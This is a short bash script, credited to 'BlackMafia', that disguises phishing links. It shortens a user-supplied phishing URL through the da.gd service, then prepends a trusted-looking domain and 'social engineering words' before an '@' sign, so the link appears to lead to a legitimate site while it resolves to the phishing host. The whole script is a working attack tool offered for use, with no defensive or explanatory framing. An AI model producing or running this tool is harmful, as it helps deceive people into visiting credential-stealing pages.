# Bash Script for Hide Phishing URL Created by BlackMafia

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "\e[1;31;42m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗\e[0m"
echo -e "\e[1;31;42m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝\e[0m"
echo -e "\e[1;31;42m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░\e[0m"
echo -e "\e[1;31;42m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░\e[0m"
echo -e "\e[1;31;42m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗\e[0m"
echo -e "\e[1;31;42m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\e[0m"
echo -e "\e[1;31;42m███╗░░░███╗░█████╗░███████╗██╗░█████╗░\e[0m"
echo -e "\e[1;31;42m████╗░████║██╔══██╗██╔════╝██║██╔══██╗\e[0m"
echo -e "\e[1;31;42m██╔████╔██║███████║█████╗░░██║███████║\e[0m"
echo -e "\e[1;31;42m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║\e[0m"
echo -e "\e[1;31;42m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║\e[0m"
echo -e "\e[1;31;42m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝\e[0m"
echo -e "\e[1;31;42m------ Your Mind is Your Best Weapon------\e[0m"
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m \n"
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
short=$(curl -s https://da.gd/s/?url=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### Making Domain ###\e[0m"
echo 'Domain to Make the Phishing URL (with http or https), ex https://google.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nType social engineering words:(like free-money, best-pubg-tricks)'
echo -e "\e[31mDon't use space just use '-' between social engineering words\e[0m"
echo -en "\e[32m=>\e[0m "
read words
echo -e "\nGenerating Phish Link...\n"
final=$mask-$words@$shorter
echo -e "Here is the MaskPhish URL:\e[32m ${final} \e[0m\n"
